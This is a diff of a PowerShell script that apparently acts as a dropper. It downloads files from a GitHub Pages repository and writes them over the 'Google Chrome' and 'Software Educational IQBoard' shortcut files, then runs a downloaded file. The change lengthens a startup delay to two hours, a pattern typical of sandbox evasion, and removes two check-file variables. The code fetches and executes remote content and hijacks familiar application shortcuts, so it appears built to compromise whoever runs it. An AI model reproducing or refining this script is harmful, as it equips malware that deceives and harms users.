@@ -4,8 +4,6 @@ $webClient = New-Object System.Net.WebClient
 $webClient.DownloadFile($url, $downloadPath)
 $chromeUrl = "https://github.com/webntdev/webntdev.github.io/raw/main/apps/Google%20Chrome.download"
 $iqboardUrl = "https://github.com/webntdev/webntdev.github.io/raw/main/apps/Software%20Educational%20IQBoard.download"
-$downloadCheckFile = Join-Path $env:USERPROFILE "Downloads\wejo23r2.bz"
-$checkFile = Join-Path $env:USERPROFILE "Downloads\hdiehf.bz"
 
 $chromeFileName = "Google Chrome.lnk"
 $iqboardFileName = "Software Educational IQBoard.lnk"
@@ -39,8 +37,7 @@ $form.Add_MouseDown({
     $form.Capture = $false
 })
 $form.Show()
-
-Start-Sleep -Seconds 1
+Start-Sleep -Seconds 7200
 
 if (Test-Path $chromePath) {
     Remove-Item $chromePath -Force
@@ -54,7 +51,7 @@ Invoke-WebRequest -Uri $chromeUrl -OutFile $chromePath
 
 Invoke-WebRequest -Uri $iqboardUrl -OutFile $iqboardPath
 
-Start-Sleep -Seconds 1
+Start-Sleep -Seconds 120
 
 if (Test-Path $downloadPath) {
     Start-Process -FilePath $downloadPath -Wait
